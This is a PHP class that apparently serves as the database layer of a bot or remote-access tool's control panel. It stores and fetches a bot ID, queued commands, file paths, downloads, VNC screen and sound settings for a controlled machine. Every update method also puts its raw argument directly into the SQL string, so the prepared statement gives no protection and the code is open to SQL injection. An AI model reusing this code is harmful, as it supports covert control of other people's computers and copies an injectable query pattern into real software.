<?php
class database{
	function ws_UpdateBotID($botid){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET botid='$botid' WHERE id='1'");
		$statement->execute([$botid]);
	}
	function ws_UpdateCommand($command){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET command='$command' WHERE id='1'");
		$statement->execute([$command]);
	}
	function ws_UpdateFileFolder($FileFolder){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET FileFolder='$FileFolder' WHERE id='1'");
		$statement->execute([$FileFolder]);
	}
	function ws_UpdatePath($Path){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET path='$Path' WHERE id='1'");
		$statement->execute([$Path]);
	}
	function ws_UpdateStatusFileFolder($status){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET statusfilefolder='$status' WHERE id='1'");
		$statement->execute([$status]);
	}
	function ws_UpdateDownloadFile($path){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET DownloadFile='$path' WHERE id='1'");
		$statement->execute([$path]);
	}
	function ws_UpdateVNCscreen($name){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET vncscreen='$name' WHERE id='1'");
		$statement->execute([$name]);
	}
	function ws_UpdateSound($name){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET sound='$name' WHERE id='1'");
		$statement->execute([$name]);
	}
	function ws_UpdateLastConnect($time){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET lastconnect='$time' WHERE id='1'");
		$statement->execute([$time]);
	}
	function ws_GetHandshake(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT handshake FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['handshake'];
		}
		return '';
	}
	function ws_GetBotID(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT botid FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['botid'];
		}
		return '';
	}
	function ws_GetDownloadFile(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT DownloadFile FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['DownloadFile'];
		}
		return '';
	}
	function ws_GetCommand(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT command FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['command'];
		}
		return '';
	}
	function ws_GetPath(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT path FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['path'];
		}
		return '';
	}
	function ws_GetFileFolder(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT FileFolder FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['FileFolder'];
		}
		return '';
	}
	function ws_GetSound(){
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("SELECT sound FROM ws WHERE id='1'");
		$statement->execute();
		foreach($statement as $row){
			return $row['sound'];
		}
		return '';
	}
}
